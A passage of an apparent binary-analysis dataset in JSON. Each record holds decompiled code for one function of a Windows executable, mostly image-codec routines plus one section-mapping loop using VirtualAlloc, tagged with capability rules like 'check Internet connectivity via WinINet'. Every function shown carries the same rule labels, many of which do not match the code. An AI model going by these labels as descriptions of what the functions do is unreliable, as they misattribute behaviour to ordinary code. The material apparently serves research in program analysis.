0x40);\n            for (iVar4 = 0; iVar4 < *(in_EAX + 0x38); iVar4 = iVar4 + 1) {\n                fcn.00440b88(*(iVar3 + 0xc) * arg_8h);\n                iVar3 = iVar3 + 0x54;\n            }\n            *arg_ch = arg_8h;\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 652
    },
    "00440d20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440d20(uint32_t arg_8h, uint32_t *arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint32_t *in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x150);\n    iVar2 = *(in_EAX + 0xe8) * 3;\n    do {\n        if (arg_8h <= *arg_ch) {\n            return;\n        }\n        if (*in_ECX < arg_14h) {\n            uVar3 = *(iVar1 + 0x3c) - *(iVar1 + 0x34);\n            uVar4 = arg_14h - *in_ECX;\n            if (uVar3 < uVar4) {\n                uVar4 = uVar3;\n            }\n            (**(*(in_EAX + 0x15c) + 4))(uVar4, *(iVar1 + 0x34));\n            if (*(in_EAX + 0x20) == *(iVar1 + 0x30)) {\n                for (var_14h = 0; var_14h < *(in_EAX + 0x38); var_14h = var_14h + 1) {\n                    for (iVar5 = 1; iVar5 <= *(in_EAX + 0xe8); iVar5 = iVar5 + 1) {\n                        fcn.0043e4e0(*(in_EAX + 0x1c), 1, -iVar5);\n                    }\n                }\n            }\n            *in_ECX = *in_ECX + uVar4;\n            *(iVar1 + 0x34) = *(iVar1 + 0x34) + uVar4;\n            *(iVar1 + 0x30) = *(iVar1 + 0x30) - uVar4;\n        }\n        else {\n            if (*(iVar1 + 0x30) != 0) {\n                return;\n            }\n            if (*(iVar1 + 0x34) < *(iVar1 + 0x3c)) {\n                for (var_14h = 0; var_14h < *(in_EAX + 0x38); var_14h = var_14h + 1) {\n                    fcn.00440b88(*(iVar1 + 0x3c));\n                }\n                *(iVar1 + 0x34) = *(iVar1 + 0x3c);\n            }\n        }\n        if (*(iVar1 + 0x34) == *(iVar1 + 0x3c)) {\n            (**(*(in_EAX + 0x160) + 4))(*arg_ch, arg_10h);\n            *arg_ch = *arg_ch + 1;\n            *(iVar1 + 0x38) = *(iVar1 + 0x38) + *(in_EAX + 0xe8);\n            if (iVar2 <= *(iVar1 + 0x38)) {\n                *(iVar1 + 0x38) = 0;\n            }\n            if (iVar2 <= *(iVar1 + 0x34)) {\n                *(iVar1 + 0x34) = 0;\n            }\n            *(iVar1 + 0x3c) = *(in_EAX + 0xe8) + *(iVar1 + 0x34);\n        }\n    } while( true );\n}\n",
        "token_count": 828
    },
    "00440fe0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440fe0(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (param_2 != 0) {\n        *(*in_EAX + 0x14) = 4;\n        (***in_EAX)(param_1);\n    }\n    puVar1 = (**in_EAX[1])();\n    in_EAX[0x54] = puVar1;\n    *puVar1 = 0x440b4c;\n    if (*(in_EAX[0x58] + 8) == 0) {\n        puVar1[1] = fcn.00440bc0;\n        puVar1 = puVar1 + 2;\n        for (iVar3 = 0; iVar3 < in_EAX[0xe]; iVar3 = iVar3 + 1) {\n            uVar2 = (**(in_EAX[1] + 8))(in_EAX[0x3a]);\n            *puVar1 = uVar2;\n            puVar1 = puVar1 + 1;\n        }\n    }\n    else {\n        puVar1[1] = fcn.00440d20;\n        fcn.00440ec8();\n    }\n    return;\n}\n",
        "token_count": 297
    },
    "00441f18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00441f18(int32_t arg_8h)\n\n{\n    uchar uVar1;\n    int32_t *in_EAX;\n    uchar *puVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int32_t in_EDX;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((0 < arg_8h - in_ECX) && (iVar3 = 0,  0 < in_EDX)) {\n        do {\n            puVar2 = *in_EAX + in_ECX;\n            uVar1 = puVar2[-1];\n            for (iVar4 = arg_8h - in_ECX; 0 < iVar4; iVar4 = iVar4 + -1) {\n                *puVar2 = uVar1;\n                puVar2 = puVar2 + 1;\n            }\n            iVar3 = iVar3 + 1;\n            in_EAX = in_EAX + 1;\n        } while (iVar3 < in_EDX);\n    }\n    return;\n}\n",
        "token_count": 245
    },
    "00442294": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442294(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    uint8_t *puVar10;\n    int32_t in_EAX;\n    int32_t iVar11;\n    uint8_t **in_ECX;\n    int32_t iVar12;\n    int32_t in_EDX;\n    int32_t iVar13;\n    uint8_t **var_2ch;\n    int32_t *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EDX + 0x1c);\n    fcn.00441f18(iVar1 << 4);\n    iVar11 = *(in_EAX + 0xbc) * 0x10;\n    iVar12 = *(in_EAX + 0xbc) * -0x50 + 0x4000;\n    var_28h = arg_8h;\n    var_2ch = in_ECX;\n    for (var_8h = 0; var_8h < *(in_EDX + 0xc); var_8h = var_8h + 1) {\n        puVar2 = *var_28h;\n        puVar3 = *var_2ch;\n        puVar4 = var_2ch[2];\n        puVar5 = var_2ch[1];\n        puVar6 = var_2ch[-1];\n        *puVar2 = (*puVar3 + puVar3[1] + *puVar5 + puVar5[1]) * iVar12 +\n                  ((*puVar6 + puVar6[1] + *puVar4 + puVar4[1] + *puVar3 + puVar3[2] + *puVar5 + puVar5[2]) * 2 +\n                  *puVar6 + puVar6[2] + *puVar4 + puVar4[2]) * iVar11 + 0x8000 >> 0x10;\n        iVar13 = iVar1 * 8 + -2;\n        while( true ) {\n            puVar2 = puVar2 + 1;\n            puVar10 = puVar4 + 2;\n            puVar9 = puVar6 + 2;\n            puVar8 = puVar5 + 2;\n            puVar7 = puVar3 + 2;\n            if (iVar13 == 0) break;\n            *puVar2 = (*puVar7 + puVar3[3] + *puVar8 + puVar5[3]) * iVar12 +\n                      ((*puVar9 + puVar6[3] + *puVar10 + puVar4[3] + puVar3[1] + puVar3[4] + puVar5[1] + puVar5[4]) * 2\n                      + puVar6[1] + puVar6[4] + puVar4[1] + puVar4[4]) * iVar11 + 0x8000 >> 0x10;\n            iVar13 = iVar13 + -1;\n            puVar3 = puVar7;\n            puVar5 = puVar8;\n            puVar6 = puVar9;\n            puVar4 = puVar10;\n        }\n        *puVar2 = (*puVar7 + puVar3[3] + *puVar8 + puVar5[3]) * iVar12 +\n                  ((*puVar9 + puVar6[3] + *puVar10 + puVar4[3] + puVar3[1] + puVar3[3] + puVar5[1] + puVar5[3]) * 2 +\n                  puVar6[1] + puVar6[3] + puVar4[1] + puVar4[3]) * iVar11 + 0x8000 >> 0x10;\n        var_2ch = var_2ch + 2;\n        var_28h = var_28h + 1;\n    }\n    return;\n}\n",
        "token_count": 989
    },
    "00442524": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442524(int32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uchar *puVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    int32_t in_EAX;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint8_t **in_ECX;\n    int32_t iVar8;\n    uint8_t *puVar9;\n    int32_t in_EDX;\n    int32_t arg_8h_00;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint8_t **var_34h;\n    int32_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = *(in_EDX + 0x1c) * 8;\n    fcn.00441f18(arg_8h_00);\n    iVar8 = *(in_EAX + 0xbc) * -0x200 + 0x10000;\n    iVar5 = *(in_EAX + 0xbc) * 0x40;\n    var_30h = arg_8h;\n    var_34h = in_ECX;\n    for (var_8h = 0; var_8h < *(in_EDX + 0xc); var_8h = var_8h + 1) {\n        puVar2 = *var_30h;\n        uVar6 = **var_34h;\n        puVar9 = *var_34h + 1;\n        puVar3 = var_34h[1] + 1;\n        puVar4 = var_34h[-1] + 1;\n        iVar10 = *var_34h[-1] + *var_34h[1] + uVar6;\n        iVar11 = *puVar4 + *puVar3 + *puVar9;\n        *puVar2 = uVar6 * iVar8 + ((iVar10 * 2 - uVar6) + iVar11) * iVar5 + 0x8000 >> 0x10;\n        for (iVar7 = arg_8h_00 + -2; puVar2 = puVar2 + 1,  iVar7 != 0; iVar7 = iVar7 + -1) {\n            uVar1 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar4 = puVar4 + 1;\n            puVar3 = puVar3 + 1;\n            iVar12 = *puVar4 + *puVar3 + *puVar9;\n            *puVar2 = uVar1 * iVar8 + ((iVar11 - uVar1) + iVar10 + iVar12) * iVar5 + 0x8000 >> 0x10;\n            iVar10 = iVar11;\n            iVar11 = iVar12;\n        }\n        *puVar2 = *puVar9 * iVar8 + ((iVar11 * 2 - *puVar9) + iVar10) * iVar5 + 0x8000 >> 0x10;\n        var_34h = var_34h + 1;\n        var_30h = var_30h + 1;\n    }\n    return;\n}\n",
        "token_count": 791
    },
    "004426b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.004426b4(void)\n\n{\n    int32_t *in_EAX;\n    uint *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code **ppcVar5;\n    int32_t iStack20;\n    \n    iStack20 = 1;\n    puVar1 = (**in_EAX[1])();\n    in_EAX[0x58] = puVar1;\n    *puVar1 = 0x441f14;\n    puVar1[1] = fcn.00441f68;\n    puVar1[2] = 0;\n    if (in_EAX[0x2e] != 0) {\n        *(*in_EAX + 0x14) = 0x19;\n        (***in_EAX)();\n    }\n    iVar4 = in_EAX[0x10];\n    ppcVar5 = puVar1 + 3;\n    puVar2 = puVar1;\n    for (iVar3 = 0; iVar3 < in_EAX[0xe]; iVar3 = iVar3 + 1) {\n        puVar2 = *(iVar4 + 8);\n        if ((puVar2 == in_EAX[0x39]) && (*(iVar4 + 0xc) == in_EAX[0x3a])) {\n            if (in_EAX[0x2f] == 0) {\n                *ppcVar5 = fcn.004420fc;\n            }\n            else {\n                *ppcVar5 = fcn.00442524;\n                puVar1[2] = 1;\n            }\n        }\n        else {\n            puVar2 = *(iVar4 + 8) * 2;\n            if ((puVar2 == in_EAX[0x39]) && (*(iVar4 + 0xc) == in_EAX[0x3a])) {\n                iStack20 = 0;\n                *ppcVar5 = fcn.00442148;\n            }\n            else {\n                puVar2 = *(iVar4 + 8) * 2;\n                if ((puVar2 == in_EAX[0x39]) && (*(iVar4 + 0xc) * 2 == in_EAX[0x3a])) {\n                    if (in_EAX[0x2f] == 0) {\n                        *ppcVar5 = fcn.004421dc;\n                    }\n                    else {\n                        *ppcVar5 = fcn.00442294;\n                        puVar1[2] = 1;\n                    }\n                }\n                else if ((in_EAX[0x39] % *(iVar4 + 8) == 0) &&\n                        (puVar2 = in_EAX[0x3a] / *(iVar4 + 0xc),  in_EAX[0x3a] % *(iVar4 + 0xc) == 0)) {\n                    iStack20 = 0;\n                    *ppcVar5 = fcn.00441fec;\n                }\n                else {\n                    *(*in_EAX + 0x14) = 0x26;\n                    puVar2 = (***in_EAX)();\n                }\n            }\n        }\n        ppcVar5 = ppcVar5 + 1;\n        iVar4 = iVar4 + 0x54;\n    }\n    if ((in_EAX[0x2f] != 0) && (iStack20 == 0)) {\n        *(*in_EAX + 0x14) = 99;\n        puVar2 = (**(*in_EAX + 4))();\n    }\n    return CONCAT44(iStack20, puVar2);\n}\n",
        "token_count": 792
    },
    "00442f0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00442f0c(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    iVar3 = *(in_EAX + 0x1c);\n    if (param_1 == 0) {\n        piVar1 = *(in_EAX + 0x20);\n        *(*piVar1 + 0x14) = 0x28;\n        (***piVar1)();\n    }\n    if (*(in_EAX + 0xc) == 0) {\n        iVar3 = iVar3 + param_1;\n        uVar4 = (param_2 & (1 << (param_1 & 0x1f)) - 1U) << (0x18U - iVar3 & 0x1f) | *(in_EAX + 0x18);\n        for (; 7 < iVar3; iVar3 = iVar3 + -8) {\n            puVar2 = *(in_EAX + 0x10);\n            *(in_EAX + 0x10) = *(in_EAX + 0x10) + 1;\n            uVar5 = uVar4 >> 0x10 & 0xff;\n            *puVar2 = uVar5;\n            piVar1 = in_EAX + 0x14;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 == 0) {\n                fcn.00442edc();\n            }\n            if (uVar5 == 0xff) {\n                puVar2 = *(in_EAX + 0x10);\n                *(in_EAX + 0x10) = *(in_EAX + 0x10) + 1;\n                *puVar2 = 0;\n                piVar1 = in_EAX + 0x14;\n                *piVar1 = *piVar1 + -1;\n                if (*piVar1 == 0) {\n                    fcn.00442edc();\n                }\n            }\n            uVar4 = uVar4 << 8;\n        }\n        *(in_EAX + 0x18) = uVar4;\n        *(in_EAX + 0x1c) = iVar3;\n    }\n    return;\n}\n",
        "token_count": 529
    },
    "00442fc8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00442fc8(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xc) != 0) {\n        piVar1 = *(in_EAX + 0x5c + param_2 * 4) + param_1 * 4;\n        *piVar1 = *piVar1 + 1;\n        return;\n    }\n    fcn.00442f0c();\n    return;\n}\n",
        "token_count": 124
    },
    "00442ff4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00442ff4(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0xc) == 0) && (param_1 != 0)) {\n        do {\n            fcn.00442f0c();\n            param_1 = param_1 + -1;\n        } while (param_1 != 0);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "00443084": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443084(uint param_1, char param_2)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    char *pcVar3;\n    int32_t in_EAX;\n    uint *puVar4;\n    int32_t iVar5;\n    \n    fcn.00443020();\n    if (*(in_EAX + 0xc) == 0) {\n        fcn.00442fa8();\n        puVar2 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + 1;\n        *puVar2 = 0xff;\n        piVar1 = in_EAX + 0x14;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.00442edc();\n        }\n        pcVar3 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + 1;\n        *pcVar3 = param_2 + -0x30;\n        piVar1 = in_EAX + 0x14;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.00442edc();\n        }\n    }\n    if (*(*(in_EAX + 0x20) + 0x138) == 0) {\n        puVar4 = in_EAX + 0x24;\n        for (iVar5 = 0; iVar5 < *(*(in_EAX + 0x20) + 0xf0); iVar5 = iVar5 + 1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        return;\n    }\n    *(in_EAX + 0x38) = 0;\n    *(in_EAX + 0x3c) = 0;\n    return;\n}\n",
        "token_count": 449
    },
    "00443f50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00443f50(int32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    char *pcVar4;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t *piVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint8_t *puVar8;\n    uint var_530h;\n    uint var_12ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint8_t *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    if ((in_ECX < 0) || (3 < in_ECX)) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0x32;\n        *(iVar2 + 0x18) = in_ECX;\n        (***in_EAX)();\n    }\n    if (var_8h == 0) {\n        var_ch = var_4h[in_ECX + 0x19];\n    }\n    else {\n        var_ch = var_4h[in_ECX + 0x15];\n    }\n    if (var_ch == 0) {\n        iVar2 = *var_4h;\n        *(iVar2 + 0x14) = 0x32;\n        *(iVar2 + 0x18) = in_ECX;\n        (***var_4h)();\n    }\n    if (*arg_8h == 0) {\n        iVar2 = (**var_4h[1])();\n        *arg_8h = iVar2;\n    }\n    var_10h = *arg_8h;\n    var_14h = 0;\n    iVar2 = 1;\n    var_20h = var_ch + 1;\n    do {\n        uVar1 = *var_20h;\n        if (0x100 < uVar1 + var_14h) {\n            *(*var_4h + 0x14) = 8;\n            (***var_4h)();\n        }\n        puVar3 = &var_12ch + var_14h;\n        uVar7 = uVar1;\n        while (uVar7 != 0) {\n            var_14h = var_14h + 1;\n            *puVar3 = iVar2;\n            puVar3 = puVar3 + 1;\n            uVar7 = uVar7 - 1;\n        }\n        iVar2 = iVar2 + 1;\n        var_20h = var_20h + 1;\n    } while (iVar2 < 0x11);\n    *(&var_12ch + var_14h) = 0;\n    iVar2 = 0;\n    var_18h = var_12ch;\n    iVar6 = 0;\n    while (*(&var_12ch + iVar6) != '\\0') {\n        piVar5 = &var_530h + iVar6;\n        for (pcVar4 = &var_12ch + iVar6; *pcVar4 == var_18h; pcVar4 = pcVar4 + 1) {\n            *piVar5 = iVar2;\n            iVar6 = iVar6 + 1;\n            piVar5 = piVar5 + 1;\n            iVar2 = iVar2 + 1;\n        }\n        if (1 << (var_18h & 0x1f) <= iVar2) {\n            *(*var_4h + 0x14) = 8;\n            (***var_4h)();\n        }\n        iVar2 = iVar2 * 2;\n        var_18h = var_18h + 1;\n    }\n    fcn.004318ac(var_10h + 0x400, 0, 0x100);\n    if (var_8h == 0) {\n        var_1ch = 0xff;\n    }\n    else {\n        var_1ch = 0xf;\n    }\n    var_28h = &var_12ch;\n    var_24h = &var_530h;\n    iVar2 = 0;\n    puVar8 = var_ch + 0x11;\n    if (0 < var_14h) {\n        do {\n            uVar7 = *puVar8;\n            if ((var_1ch < uVar7) || (*(var_10h + 0x400 + uVar7) != '\\0')) {\n                *(*var_4h + 0x14) = 8;\n                (***var_4h)();\n            }\n            iVar2 = iVar2 + 1;\n            puVar8 = puVar8 + 1;\n            *(var_10h + uVar7 * 4) = *var_24h;\n            *(var_10h + 0x400 + uVar7) = *var_28h;\n            var_28h = var_28h + 1;\n            var_24h = var_24h + 1;\n        } while (iVar2 < var_14h);\n    }\n    return;\n}\n",
        "token_count": 1199
    },
    "00444760": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00444760(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    uchar *puVar8;\n    int32_t iVar9;\n    uint uStack2108;\n    char acStack2104 [31];\n    char acStack2073 [5];\n    int32_t aiStack2068 [257];\n    int32_t aiStack1040 [257];\n    \n    fcn.004318ac(acStack2104, 0, 0x21);\n    fcn.004318ac(aiStack2068, 0, 0x404);\n    iVar4 = 0;\n    piVar2 = aiStack1040;\n    do {\n        *piVar2 = -1;\n        iVar4 = iVar4 + 1;\n        piVar2 = piVar2 + 1;\n    } while (iVar4 < 0x101);\n    uStack2108[0x100] = 1;\n    while( true ) {\n        iVar4 = -1;\n        iVar9 = 1000000000;\n        iVar5 = 0;\n        piVar2 = uStack2108;\n        do {\n            iVar6 = *piVar2;\n            if ((iVar6 != 0) && (iVar6 <= iVar9)) {\n                iVar4 = iVar5;\n                iVar9 = iVar6;\n            }\n            iVar5 = iVar5 + 1;\n            piVar2 = piVar2 + 1;\n        } while (iVar5 < 0x101);\n        iVar9 = -1;\n        iVar5 = 1000000000;\n        iVar6 = 0;\n        piVar2 = uStack2108;\n        do {\n            iVar1 = *piVar2;\n            if (((iVar1 != 0) && (iVar1 <= iVar5)) && (iVar4 != iVar6)) {\n                iVar9 = iVar6;\n                iVar5 = iVar1;\n            }\n            iVar6 = iVar6 + 1;\n            piVar2 = piVar2 + 1;\n        } while (iVar6 < 0x101);\n        if (iVar9 < 0) break;\n        uStack2108[iVar4] = uStack2108[iVar4] + uStack2108[iVar9];\n        uStack2108[iVar9] = 0;\n        aiStack2068[iVar4] = aiStack2068[iVar4] + 1;\n        while (iVar5 = aiStack1040[iVar4],  -1 < iVar5) {\n            aiStack2068[iVar5] = aiStack2068[iVar5] + 1;\n            iVar4 = iVar5;\n        }\n        aiStack1040[iVar4] = iVar9;\n        aiStack2068[iVar9] = aiStack2068[iVar9] + 1;\n        while (iVar9 = aiStack1040[iVar9],  -1 < iVar9) {\n            aiStack2068[iVar9] = aiStack2068[iVar9] + 1;\n        }\n    }\n    iVar4 = 0;\n    piVar2 = aiStack2068;\n    do {\n        if (*piVar2 != 0) {\n            if (0x20 < *piVar2) {\n                *(*in_EAX + 0x14) = 0x27;\n                (***in_EAX)();\n            }\n            acStack2104[*piVar2] = acStack2104[*piVar2] + '\\x01';\n        }\n        iVar4 = iVar4 + 1;\n        piVar2 = piVar2 + 1;\n    } while (iVar4 < 0x101);\n    pcVar7 = acStack2073 + 1;\n    iVar4 = 0x20;\n    do {\n        while (iVar9 = iVar4,  *pcVar7 != '\\0') {\n            iVar4 = iVar9 + -2;\n            for (pcVar3 = acStack2104 + iVar9 + -2; *pcVar3 == '\\0'; pcVar3 = pcVar3 + -1) {\n                iVar4 = iVar4 + -1;\n            }\n            *pcVar7 = *pcVar7 + -2;\n            pcVar7[-1] = pcVar7[-1] + '\\x01';\n            acStack2104[iVar4 + 1] = acStack2104[iVar4 + 1] + '\\x02';\n            acStack2104[iVar4] = acStack2104[iVar4] + -1;\n            iVar4 = iVar9;\n        }\n        iVar4 = iVar9 + -1;\n        pcVar7 = pcVar7 + -1;\n    } while (0x10 < iVar4);\n    for (pcVar7 = acStack2104 + iVar9 + -1; *pcVar7 == '\\0'; pcVar7 = pcVar7 + -1) {\n        iVar4 = iVar4 + -1;\n    }\n    acStack2104[iVar4] = acStack2104[iVar4] + -1;\n    fcn.004318c0(param_2, acStack2104, 0x11);\n    iVar9 = 0;\n    iVar4 = 1;\n    do {\n        iVar5 = 0;\n        puVar8 = param_2 + 0x11 + iVar9;\n        piVar2 = aiStack2068;\n        do {\n            if (iVar4 == *piVar2) {\n                *puVar8 = iVar5;\n                iVar9 = iVar9 + 1;\n                puVar8 = puVar8 + 1;\n            }\n            iVar5 = iVar5 + 1;\n            piVar2 = piVar2 + 1;\n        } while (iVar5 < 0x100);\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x21);\n    *(param_2 + 0x114) = 0;\n    return;\n}\n",
        "token_count": 1321
    },
    "00444bc4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00444bc4(int32_t *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint auStack264 [13];\n    int32_t iStack212;\n    \n    puVar4 = auStack264;\n    for (iVar2 = 0x3e; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *param_2;\n        param_2 = param_2 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    iVar2 = fcn.00444b6c(*param_1);\n    uVar3 = *(*param_1 + 6);\n    if (-1 < uVar3 - 1) {\n        do {\n            if (*(iVar2 + 0x10) == 0) {\n                if (0 < iStack212) {\n                    uVar9 = 4;\n                    uVar8 = 0x1000;\n                    iVar6 = *(iVar2 + 0xc);\n                    uVar7 = 0;\n                    iVar5 = iStack212;\n                    uVar1 = fcn.00444ad0(iVar6, 0);\n                    uVar1 = sub.kernel32.dll_VirtualAlloc_1(uVar1, iVar6, uVar7, iVar5, uVar8, uVar9);\n                    *(iVar6 + 8) = uVar1;\n                    fcn.00403ae4();\n                }\n                fcn.00444aa0(0x28, 0);\n            }\n            else {\n                uVar10 = 4;\n                uVar9 = 0x1000;\n                uVar1 = *(iVar2 + 0x10);\n                iVar6 = *(iVar2 + 0xc);\n                uVar8 = 0;\n                uVar7 = fcn.00444ad0(iVar6, 0);\n                uVar1 = sub.kernel32.dll_VirtualAlloc_1(uVar7, iVar6, uVar8, uVar1, uVar9, uVar10);\n                iVar5 = 0;\n                fcn.00444ad0(*(iVar6 + 0x14), 0);\n                fcn.00408460();\n                *(iVar5 + 8) = uVar1;\n                fcn.00444aa0(0x28, 0);\n            }\n            uVar3 = uVar3 - 1;\n        } while (uVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 606
    },
    "00444cc8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
